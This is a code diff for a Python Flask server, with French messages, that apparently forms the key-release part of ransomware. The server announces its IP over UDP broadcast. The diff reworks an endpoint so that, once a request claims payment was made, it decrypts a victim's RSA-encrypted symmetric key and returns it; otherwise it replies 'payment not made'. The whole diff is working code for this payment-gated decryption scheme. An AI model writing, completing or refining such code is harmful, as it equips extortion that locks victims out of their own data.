@@ -2,7 +2,8 @@ from flask import Flask, request, jsonify
 from keys import load_private_key
 import socket
 import threading
-from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 import signal
 import os
 import sys
@@ -31,18 +32,23 @@ def broadcast_server():
         sock.sendto(f"SERVER_IP:{server_ip}".encode(), ('<broadcast>', 5001))
         stop_event.wait(5)  # Envoyer un message toutes les 5 secondes
 
-@app.route('/get_private_key', methods=['POST'])
-def get_private_key():
+@app.route('/get_symmetric_key', methods=['POST'])
+def get_symmetric_key():
     data = request.json
     if data.get('paid') == True:
-        private_key_pem = private_key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.PKCS8,
-            encryption_algorithm=serialization.NoEncryption()
+        encrypted_symmetric_key = bytes.fromhex(data['encrypted_symmetric_key'])
+        symmetric_key = private_key.decrypt(
+            encrypted_symmetric_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
         )
-        return jsonify({'private_key': private_key_pem.decode('utf-8')})
+        return jsonify({'symmetric_key': symmetric_key.hex()})
     else:
         return jsonify({'error': 'Paiement non effectué'}), 400
+
 
 def signal_handler(sig, frame):
     stop_event.set()
